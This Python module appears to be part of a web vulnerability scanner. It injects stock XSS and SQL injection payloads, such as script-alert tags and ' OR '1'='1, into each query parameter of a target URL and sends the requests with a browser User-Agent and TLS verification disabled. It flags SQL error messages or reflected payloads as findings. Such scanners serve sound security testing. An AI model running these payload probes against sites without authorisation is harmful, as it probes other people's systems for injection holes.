import requests
from urllib .parse import urlparse ,urlencode ,urljoin ,parse_qsl
from urllib .parse import quote as url_quote

XSS_PAYLOADS =[
"<script>alert(1)</script>",
'"><script>alert(1)</script>',
"<img src=x onerror=alert(1)>",
]

SQLI_PAYLOADS =[
"' OR '1'='1",
"' OR 1=1--",
"' UNION SELECT NULL--",
"' AND 1=1--",
'" OR "1"="1',
]

def _extract_params (url :str )->list [tuple [str ,str ]]|None :
    parsed =urlparse (url )
    if not parsed .query :
        return None
    return list (parse_qsl (parsed .query ))

def _build_test_url (base :str ,param :str ,payload :str ,params :list )->str :
    new_params =[(p ,v if p !=param else payload )for p ,v in params ]
    query_string =urlencode (new_params )
    return f"{base }?{query_string }"

def _test_sqli (target :str ,url :str ,timeout :int =8 )->list [dict ]:
    findings =[]
    params =_extract_params (url )
    if not params :
        return findings

    base_url =url .split ("?")[0 ]
    parsed =urlparse (url )

    for param_name ,_ in params :
        for payload in SQLI_PAYLOADS :
            try :
                test_url =_build_test_url (base_url ,param_name ,payload ,params )
                resp =requests .get (test_url ,timeout =timeout ,headers ={
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                },verify =False )
                requests .packages .urllib3 .disable_warnings ()

                error_signals =[
                "sql","mysql","syntax error","unclosed quotation",
                "odbc","driver","ORA-","PostgreSQL","SQLite",
                ]
                body_lower =resp .text .lower ()
                if any (sig in body_lower for sig in error_signals ):
                    findings .append ({
                    "type":"SQL Injection",
                    "severity":"high",
                    "description":f"Potential SQLi in parameter '{param_name }'",
                    "url":test_url ,
                    "detail":f"Payload: {payload }",
                    "method":"GET",
                    })
                    break
            except Exception :
                continue
    return findings

def _test_xss (target :str ,url :str ,timeout :int =8 )->list [dict ]:
    findings =[]
    params =_extract_params (url )
    if not params :
        return findings

    base_url =url .split ("?")[0 ]

    for param_name ,_ in params :
        for payload in XSS_PAYLOADS :
            try :
                test_url =_build_test_url (base_url ,param_name ,payload ,params )
                resp =requests .get (test_url ,timeout =timeout ,headers ={
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                },verify =False )
                requests .packages .urllib3 .disable_warnings ()

                if payload in resp .text :
                    findings .append ({
                    "type":"Reflected XSS",
                    "severity":"high",
                    "description":f"Potential XSS in parameter '{param_name }'",
                    "url":test_url ,
                    "detail":f"Payload reflected in response: {payload [:50 ]}",
                    "method":"GET",
                    })
                    break
            except Exception :
                continue
    return findings

def run (target :str ,timeout :int =8 )->dict :
    if not target .startswith (("http://","https://")):
        target =f"https://{target }"

    results ={
    "target":target ,
    "vulnerabilities":[],
    }

    sqli =_test_sqli (target ,target ,timeout )
    xss =_test_xss (target ,target ,timeout )

    results ["vulnerabilities"]=sqli +xss
    results ["total"]=len (results ["vulnerabilities"])
    results ["high"]=sum (1 for v in results ["vulnerabilities"]if v ["severity"]=="high")
    results ["medium"]=sum (1 for v in results ["vulnerabilities"]if v ["severity"]=="medium")
    results ["low"]=sum (1 for v in results ["vulnerabilities"]if v ["severity"]=="low")

    return results
